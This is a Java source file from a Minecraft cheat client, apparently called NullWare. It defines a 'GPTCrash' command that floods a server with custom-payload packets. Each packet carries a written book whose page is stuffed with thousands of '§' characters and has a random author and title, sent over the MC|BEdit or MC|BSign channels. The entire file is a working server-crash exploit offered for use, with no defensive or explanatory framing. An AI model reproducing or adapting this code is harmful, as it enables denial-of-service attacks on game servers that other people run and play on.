package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.concurrent.ThreadLocalRandom;

public class GPTCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(int packets) {
        int pagesPerBook = 50;
        String largePayload = repeatString("§", 5000);
        int maxPayloadSize = 32767;
        int numPackets = (int) Math.ceil((double) largePayload.length() / maxPayloadSize);

        for (int i = 0; i < packets; i++) {
            for (int j = 0; j < numPackets; j++) {
                int start = j * maxPayloadSize;
                int end = Math.min(start + maxPayloadSize, largePayload.length());
                String packetPayload = largePayload.substring(start, end);

                ItemStack ultraBook = new ItemStack(Items.written_book);
                NBTTagCompound ultraCompound = new NBTTagCompound();
                NBTTagList ultraPages = new NBTTagList();

                ultraPages.appendTag(new NBTTagString(
                        String.format("[\"\",{\"text\":\"Crash Payload %d-%d\",\"bold\":true,\"color\":\"red\"},{\"text\":\"%s\"}]",
                                i + 1, j + 1, packetPayload)
                ));

                ultraCompound.setString("author", RandomStringUtils.randomAlphabetic(16));
                ultraCompound.setString("title", RandomStringUtils.randomAlphabetic(16));
                ultraCompound.setByte("resolved", (byte) 1);
                ultraCompound.setTag("pages", ultraPages);
                ultraBook.setTagCompound(ultraCompound);

                PacketBuffer ultraPacketBuffer = new PacketBuffer(Unpooled.buffer());
                ultraPacketBuffer.writeItemStackToBuffer(ultraBook);

                String ultraChannel = ThreadLocalRandom.current().nextBoolean() ? "MC|BEdit" : "MC|BSign";
                mc.getNetHandler().getNetworkManager().sendPacket(
                        new C17PacketCustomPayload(ultraChannel, new PacketBuffer(ultraPacketBuffer))
                );
            }
        }
    }

    private String repeatString(String str, int count) {
        StringBuilder builder = new StringBuilder();
        for (int i = 0; i < count; i++) {
            builder.append(str);
        }
        return builder.toString();
    }
}
